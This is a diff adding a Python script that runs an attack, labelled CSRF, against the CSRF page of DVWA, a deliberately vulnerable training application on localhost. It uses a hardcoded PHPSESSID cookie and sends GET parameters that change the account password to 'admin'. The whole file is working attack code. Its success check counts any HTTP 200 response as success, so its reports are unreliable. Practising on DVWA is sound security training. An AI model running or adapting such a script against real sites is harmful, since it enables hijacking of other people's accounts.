@@ -1,0 +1,44 @@
+import requests
+
+# Adjust the URL to point to the password change endpoint in DVWA
+vulnerable_url = 'http://127.0.0.1/vulnerabilities/csrf/'  # Replace with actual URL
+
+# Replace with your actual session cookies from DVWA
+cookies = {
+    'PHPSESSID': "5stkp2aclgrrrq4hb1re66ajm2",  
+    'security': 'low'  # Ensure the security level matches the one set in DVWA
+}
+
+# Data payload for the CSRF attack - changing password without old password
+csrf_payload = {
+    'password_new': 'admin',  # New password
+    'password_conf': 'admin',  # Confirm new password
+    'Change': 'Change'  # Adjust as per your form submit button or field name
+}
+
+# Function to perform CSRF attack
+def csrf_attack():
+    print("Performing Cross-Site Request Forgery (CSRF) Attack to Change Password...\n")
+    try:
+        # Prepare GET parameters
+        params = {
+            'password_new': csrf_payload['password_new'],
+            'password_conf': csrf_payload['password_conf'],
+            'Change': csrf_payload['Change']
+        }
+        
+        response = requests.get(vulnerable_url, cookies=cookies, params=params, timeout=10)
+
+        # Check response content or status code for successful operation (if applicable)
+        if 'Password changed.' in response.text or response.status_code == 200:
+            print("CSRF Attack successful!")
+            print("CSRF Payload Sent:", params)
+        else:
+            print("CSRF Attack unsuccessful.")
+            print("Response:", response.text)
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+
+# Run CSRF attack
+csrf_attack()
